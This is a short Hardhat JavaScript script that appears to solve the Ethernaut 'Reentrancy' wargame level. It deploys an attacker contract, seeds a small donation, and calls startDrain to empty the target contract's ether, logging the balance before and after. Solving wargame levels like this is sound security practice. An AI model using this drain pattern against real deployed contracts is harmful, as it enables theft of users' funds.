const { ethers , waffle } = require("hardhat");
const Runner = require('./lib/runner');
const Deployer = require('./deployer');


Runner.run(async () => {
	
    //PLACE REENTRANCY CONTRACT ADDRESS HERE (Ethernaut: contract.address)
    const contractAddr = "0x11B9a9a82B84E0B0De4F81294E64B13f3108495a";     
    
	//get contracts 
    const victim = await ethers.getContractAt("Reentrancy", contractAddr);
    const attacker = await Deployer.deploy();
	
	console.log();
	console.log("* * * ");
	console.log(`target contract balance is ${await waffle.provider.getBalance(victim.address)}`);
    
	//attacker donates a seed amount just to have a legit balance in the contract
	//  (the seed amount is the amount that you can withdraw on each iteration of 
	//  the attack )
    const seedAmount = ethers.utils.parseEther('0.001');
	await victim.donate(attacker.address, {value:seedAmount});
	
	//attacker begin attack 
	await attacker.startDrain(victim.address, seedAmount); 
	
	console.log(`target contract balance is ${await waffle.provider.getBalance(victim.address)}`);
	console.log("* * * ");
});
